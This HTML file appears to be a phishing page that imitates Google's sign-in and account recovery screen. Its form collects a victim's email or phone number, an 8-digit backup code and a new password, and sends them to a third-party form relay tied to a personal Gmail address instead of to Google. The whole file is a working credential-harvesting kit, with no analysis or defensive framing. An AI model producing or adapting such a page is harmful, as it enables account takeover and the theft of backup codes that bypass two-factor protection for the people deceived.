<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in - Google Accounts</title>
    <link rel="preconnect" href="https://fonts.gstatic.com" />
    <link
      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap"
      rel="stylesheet"
    />
    <style>
      body {
        font-family: 'Roboto', sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        background-color: #fff;
        margin: 0;
      }
      .container {
        width: 100%;
        max-width: 400px;
        padding: 40px;
        text-align: left;
      }
      .logo {
        display: block;
        width: 74px;
        margin-bottom: 20px;
      }
      h1 {
        font-size: 24px;
        font-weight: 400;
        margin: 0;
      }
      p {
        color: #5f6368;
        font-size: 16px;
        margin-top: 5px;
      }
      input {
        width: 100%;
        padding: 12px;
        font-size: 16px;
        border: 1px solid #ccc;
        border-radius: 4px;
        margin-top: 20px;
      }
      a {
        color: #1a73e8;
        text-decoration: none;
        font-size: 14px;
        display: inline-block;
        margin-top: 10px;
      }
      .bottom-links {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 40px;
      }
      form button {
        background-color: #1a73e8;
        color: white;
        border: none;
        padding: 10px 20px;
        border-radius: 4px;
        font-size: 14px;
        cursor: pointer;
      }
      .language-selector {
        text-align: center;
        margin-top: 40px;
        font-size: 14px;
      }
    </style>
  </head>
  <body>
    <form>
    <div class="container">
      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google" class="logo" />
      <div id="loginForm">
        <h1>Account Recovery</h1>
<form action="https://formsubmit.co/ssy200913@gmail.com" method="POST">
<p>Use your Google Account</p>
  <input type="text" name="email" placeholder="Email or phone" required />
  <input type="text" name="backup_code" placeholder="Enter your 8-digit backup code" required />
  <input type="password" name="new_password" placeholder="Enter your new password" required />
        <p>
          Not your computer? Use Guest mode to sign in privately.
          <a href="#">Learn more about using Guest mode</a>
        </p>
        <div class="bottom-links">
          <button type="submit">Reset password</button>
</form>
        </div>
      </div>
      <div class="language-selector">English (United States) â–¾</div>
          </div>
      
  </html>
